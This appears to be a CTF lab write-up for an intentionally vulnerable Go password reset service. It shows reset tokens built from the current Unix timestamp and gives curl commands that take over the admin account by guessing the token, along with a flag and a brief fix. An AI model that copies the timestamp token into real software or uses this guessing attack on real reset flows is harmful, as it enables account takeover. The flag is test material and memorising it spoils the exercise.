# A04: Insecure Design

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

A password reset flow: `POST /api/forgot-password` requests a reset,
`POST /api/reset-password` completes it with a token.

## The bug

There's no injection, no missing auth check — the *design* itself is flawed:

```go
// BUG: the "reset token" is just the current Unix timestamp as a string.
func generateToken() string {
    return fmt.Sprintf("%d", time.Now().Unix())
}
```

A token generated by `POST /api/forgot-password` is just `time.Now().Unix()`
at that moment — not a CSPRNG value. No fix to the *code* around this line
helps; the token generation strategy needs to be replaced entirely.

## Exploit

Trigger a reset for `admin`, then try tokens within a few seconds of "now" —
you don't need to know the exact second, just be close:

```bash
curl -s -X POST http://localhost:9004/api/forgot-password -d '{"username":"admin"}'

NOW=$(date +%s)
curl -s -X POST http://localhost:9004/api/reset-password \
  -d "{\"username\":\"admin\",\"token\":\"$NOW\",\"newPassword\":\"hacked123\"}"
```

(The server accepts tokens within a ±30 second window of the current time to
make this reliably solvable without a tight race — in the real bug, an
attacker would loop over a small range of nearby timestamps.)

## Flag

`CTF{a04_pr3d1ctabl3_r3s3t_t0k3n}`

## The fix (for reference)

Generate reset tokens with `crypto/rand`, make them single-use, short-lived,
and unrelated to any observable value like a timestamp.
